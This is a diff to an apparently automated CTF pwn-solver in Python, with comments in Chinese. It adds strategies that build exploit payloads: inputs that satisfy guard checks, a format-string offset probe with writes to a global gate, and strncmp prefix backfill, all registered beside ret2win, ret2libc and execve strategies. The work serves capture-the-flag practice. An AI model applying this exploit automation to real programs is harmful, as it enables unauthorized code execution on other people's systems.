@@ -369,6 +369,65 @@ def s_ret2win_pie(ch: Challenge, f: Facts) -> Iterable[Plan]:
                        f"(ret={hex(ret_addr)}) off={v.offset}")
 
 
+# --------------------------------------------------------------------------- 1a2. 守卫（逻辑校验题）
+def s_guard_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
+    """输入直接满足 win 路径上的判定条件（题三长度+字节、题一全局门）。
+
+    载荷全部由 `guard.build_guard_payload` 从约束构造：不写死偏移/值。
+    """
+    from .guard import build_guard_payload
+    for g in getattr(f, "guards", []) or []:
+        if g.status != "solved":
+            continue
+        payload = build_guard_payload(ch, g)
+        if payload is None:
+            continue
+        kind = g.kind if g.kind in ("shell", "flag") else "shell"
+        yield Plan("guard_write", [payload + _term(g.sink)],
+                   f"guard {g.sink}@{hex(g.sink_call)} -> {g.kind} len={len(payload)}",
+                   tag=f"guard:{kind}")
+
+
+def s_guard_fmt(ch: Challenge, f: Facts) -> Iterable[Plan]:
+    """fmt 写全局门（题七）：先探 %p 序号，再按约束写 global=val。
+
+    探针拿不到序号就不产出计划（不盲猜）；blob 含换行或超出 read 容量时
+    `guard.fmt_payload` 返回 None。
+    """
+    from .guard import fmt_payload
+    guards = [g for g in getattr(f, "guards", []) or [] if g.status == "fmt"]
+    if not guards:
+        return
+    from .run import run_capture
+    out = run_capture(ch, b"AAAA." + b".%p" * 24 + b"\n", timeout=1.0)
+    idx = _fmt_offset(out)
+    if not idx:
+        return
+    for g in guards:
+        for ws in ("byte", "short", "int"):
+            blob = fmt_payload(ch, g, idx, ws)
+            if not blob:
+                continue
+            kind = g.kind if g.kind in ("shell", "flag") else "shell"
+            yield Plan("guard_fmt", [blob],
+                       f"guard fmt {g.arg}@{hex(g.call)} arg#{idx} write={ws}",
+                       tag=f"guard:{kind}")
+
+
+def s_guard_backfill(ch: Challenge, f: Facts) -> Iterable[Plan]:
+    """strncmp 回填（题六）：程序打印随机串后要求输入它的前缀。
+
+    steps 为空 —— 动态交互（读 token、回填、判定）由 orchestrator 的
+    `_try_guard_backfill` 负责。参数编码进结构化 tag（C2：不新增 Plan.meta）。
+    """
+    for b in getattr(f, "backfills", []) or []:
+        if b.status != "backfill":
+            continue
+        yield Plan("guard_backfill", [],
+                   f"backfill {b.n}B -> {b.marker!r} @ {hex(b.call)}",
+                   tag=f"guard:backfill:{b.n}:{b.marker.hex()}")
+
+
 # --------------------------------------------------------------------------- 1b. ret2flag
 def s_ret2win_flag(ch: Challenge, f: Facts) -> Iterable[Plan]:
     """只打印 flag 的题（函数体是 system("cat flag")）——不算 shell，单独记账。"""
@@ -906,10 +965,13 @@ STRATEGIES = [
     s_syscall_direct,
     s_syscall_execve,
     s_ret2win_pie,
+    s_guard_write,        # v7.4.0：逻辑校验（输入直接满足判定条件）
+    s_guard_fmt,          # v7.4.0：fmt 写全局门
     s_ret2win,
     s_ret2plt,
     s_ret2gets,
     s_ret2csu,
+    s_guard_backfill,     # v7.4.0：strncmp 回填（只产出 gate 证据）
     s_canary_fmt,
     s_ret2libc_write,
     s_ret2libc,
